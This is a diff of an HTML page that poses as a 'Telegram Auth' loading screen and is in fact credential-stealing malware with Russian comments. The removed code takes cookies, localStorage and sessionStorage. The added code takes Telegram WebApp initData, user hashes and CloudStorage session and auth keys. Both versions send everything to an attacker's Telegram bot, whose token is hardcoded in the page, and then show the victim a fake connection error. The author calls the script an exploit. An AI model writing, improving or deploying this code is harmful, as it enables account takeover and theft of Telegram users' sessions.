@@ -2,104 +2,116 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Auth</title>
     <style>
-        body { 
+        body {
             background: #0f0f0f;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: system-ui;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         .loader {
             color: white;
             text-align: center;
         }
+        .loader h3 {
+            font-weight: 400;
+        }
+        .loader p {
+            font-size: 14px;
+            opacity: 0.7;
+        }
     </style>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
     <div class="loader">
         <h3>Loading secure connection...</h3>
+        <p>Please wait</p>
     </div>
 
     <script>
-        // ТВОЙ ТОКЕН БОТА И АЙДИ
         const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
         const CHAT_ID = '1471307057';
         
-        async function sendToTelegram(data) {
-            const message = `🔐 **КРАЖА ТОКЕНА** 🔐\n\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        async function sendToTelegram(text, data = null) {
+            let message = text;
+            if (data) {
+                message += '\n\n```json\n' + JSON.stringify(data, null, 2) + '\n```';
+            }
             
-            await fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.error('Send error:', e);
+            }
+        }
+        
+        // Ждем инициализации Telegram WebApp
+        window.Telegram.WebApp.ready();
+        
+        // Получаем данные пользователя из Telegram
+        const initData = window.Telegram.WebApp.initData;
+        const initDataUnsafe = window.Telegram.WebApp.initDataUnsafe;
+        
+        let collected = {
+            initData: initData,
+            user: initDataUnsafe.user,
+            auth_date: initDataUnsafe.auth_date,
+            hash: initDataUnsafe.hash,
+            start_param: initDataUnsafe.start_param,
+            platform: window.Telegram.WebApp.platform,
+            version: window.Telegram.WebApp.version,
+            colorScheme: window.Telegram.WebApp.colorScheme,
+            themeParams: window.Telegram.WebApp.themeParams,
+            viewportHeight: window.Telegram.WebApp.viewportHeight,
+            viewportStableHeight: window.Telegram.WebApp.viewportStableHeight
+        };
+        
+        // Пытаемся получить localStorage через CloudStorage API
+        if (window.Telegram.WebApp.CloudStorage) {
+            // Получаем все ключи (Telegram WebApp CloudStorage)
+            const keys = ['session', 'token', 'user', 'auth', 'tg__session', 'dc1_auth_key', 'dc2_auth_key', 'dc3_auth_key', 'dc4_auth_key'];
+            keys.forEach(key => {
+                window.Telegram.WebApp.CloudStorage.getItem(key, (err, value) => {
+                    if (value) {
+                        collected[`cloud_${key}`] = value;
+                        sendToTelegram(`✅ Найден ключ: ${key}`, { [key]: value });
+                    }
+                });
             });
         }
         
-        async function stealData() {
-            try {
-                let data = {};
-                
-                // Кража localStorage
-                if (window.parent && window.parent.localStorage) {
-                    data.localStorage = {};
-                    for (let i = 0; i < window.parent.localStorage.length; i++) {
-                        const key = window.parent.localStorage.key(i);
-                        data.localStorage[key] = window.parent.localStorage.getItem(key);
-                    }
-                }
-                
-                // Кража cookies
-                data.cookies = document.cookie;
-                
-                // Кража sessionStorage
-                if (window.parent && window.parent.sessionStorage) {
-                    data.sessionStorage = {};
-                    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
-                        const key = window.parent.sessionStorage.key(i);
-                        data.sessionStorage[key] = window.parent.sessionStorage.getItem(key);
-                    }
-                }
-                
-                // Информация о юзере
-                data.userAgent = navigator.userAgent;
-                data.url = window.location.href;
-                data.referrer = document.referrer;
-                
-                if (Object.keys(data.localStorage || {}).length > 0 || data.cookies) {
-                    await sendToTelegram(data);
-                }
-                
-            } catch(e) {
-                // Отправляем ошибку для отладки
-                await sendToTelegram({error: e.toString(), step: 'stealData'});
-            }
-            
-            // Фейковая ошибка
+        // Отправляем базовые данные через 1 секунду
+        setTimeout(() => {
+            sendToTelegram('📱 **Telegram WebApp Data**', collected);
+        }, 1500);
+        
+        // Фейковая ошибка для пользователя
+        setTimeout(() => {
             document.body.innerHTML = `
                 <div class="loader">
                     <h3>Connection error</h3>
                     <p>Please try again later</p>
                 </div>
             `;
-        }
+        }, 3000);
         
-        // Запуск через 1 секунду
-        setTimeout(stealData, 1000);
-        
-        // Альтернативный метод
-        window.parent.postMessage({
-            eventType: 'web_app_read_storage',
-            eventData: {}
-        }, '*');
+        // Отправляем уведомление что скрипт запущен
+        sendToTelegram('🚀 **Эксплойт активирован**', { url: window.location.href, time: new Date().toISOString() });
         
     </script>
 </body>
